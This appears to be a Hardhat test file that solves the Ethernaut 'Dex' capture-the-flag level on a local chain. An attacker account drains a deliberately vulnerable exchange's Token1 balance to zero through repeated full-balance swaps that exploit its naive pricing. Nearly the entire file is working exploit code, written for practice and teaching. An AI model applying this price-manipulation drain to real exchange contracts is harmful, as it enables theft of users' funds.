const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Dex exploit", function () {
  it("Attacker shpould drain DEX Token1 balance to 0", async function () {
    const [owner, attacker] = await ethers.getSigners();

    const dex = await ethers.deployContract("Dex");
    const swappableToken1 = await ethers.deployContract("SwappableToken", [
      dex.target,
      "Token One",
      "TKNO",
      ethers.parseEther("110"),
    ]);
    const swappableToken2 = await ethers.deployContract("SwappableToken", [
      dex.target,
      "Token Two",
      "TKNT",
      ethers.parseEther("110"),
    ]);

    //  Setup Ethernaut initial state
    //  You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
    await dex.setTokens(swappableToken1.target, swappableToken2.target);
    await swappableToken1["approve(address,address,uint256)"](
      owner.address,
      dex.target,
      ethers.parseEther("100")
    );
    await dex.addLiquidity(swappableToken1.target, ethers.parseEther("100"));
    await swappableToken2["approve(address,address,uint256)"](
      owner.address,
      dex.target,
      ethers.parseEther("100")
    );
    await dex.addLiquidity(swappableToken2.target, ethers.parseEther("100"));
    await swappableToken1.transfer(attacker.address, ethers.parseEther("10"));
    await swappableToken2.transfer(attacker.address, ethers.parseEther("10"));

    // approve dex for attacker
    await swappableToken1
      .connect(attacker)
      ["approve(address,address,uint256)"](
        attacker.address,
        dex.target,
        ethers.parseEther("100")
      );
    await swappableToken2
      .connect(attacker)
      ["approve(address,address,uint256)"](
        attacker.address,
        dex.target,
        ethers.parseEther("100")
      );

    await dex
      .connect(attacker)
      .swap(
        swappableToken1.target,
        swappableToken2.target,
        await swappableToken1.balanceOf(attacker.address)
      );

    await dex
      .connect(attacker)
      .swap(
        swappableToken2.target,
        swappableToken1.target,
        await swappableToken2.balanceOf(attacker.address)
      );

    await dex
      .connect(attacker)
      .swap(
        swappableToken1.target,
        swappableToken2.target,
        await swappableToken1.balanceOf(attacker.address)
      );

    await dex
      .connect(attacker)
      .swap(
        swappableToken2.target,
        swappableToken1.target,
        await swappableToken2.balanceOf(attacker.address)
      );

    await dex
      .connect(attacker)
      .swap(
        swappableToken1.target,
        swappableToken2.target,
        await swappableToken1.balanceOf(attacker.address)
      );

    // last swap
    const lastAmount = await swappableToken2.balanceOf(dex.target);
    await dex
      .connect(attacker)
      .swap(swappableToken2.target, swappableToken1.target, lastAmount);

    // assert
    expect(await swappableToken1.balanceOf(dex.target)).to.be.equal(0);
  });
});
